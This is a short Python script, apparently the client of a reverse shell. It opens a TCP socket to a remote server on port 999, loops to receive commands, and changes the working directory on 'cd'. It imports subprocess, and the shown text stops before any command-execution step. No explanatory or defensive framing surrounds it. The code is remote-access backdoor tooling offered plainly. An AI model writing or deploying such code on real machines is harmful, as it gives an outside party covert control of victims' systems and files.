import socket
import os
import sys
import subprocess
# Create a TCP socket and connect to the server

s= socket.socket()
host = ''
port=999
s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))